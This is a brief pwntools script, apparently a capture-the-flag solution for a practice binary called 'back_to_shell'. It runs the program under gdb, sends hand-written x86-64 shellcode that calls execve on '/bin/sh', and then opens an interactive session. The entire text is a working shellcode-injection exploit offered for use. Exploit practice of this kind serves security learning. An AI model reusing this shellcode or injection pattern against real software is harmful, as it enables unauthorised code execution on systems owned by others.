from pwn import *

DEBUG_COMMAND = """
c
"""

c = gdb.debug("./back_to_shell", gdbscript=DEBUG_COMMAND)

input("Wait")

c.sendline(b"\x48\x89\xC7\x48\x83\xC7\x13\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")
c.interactive()
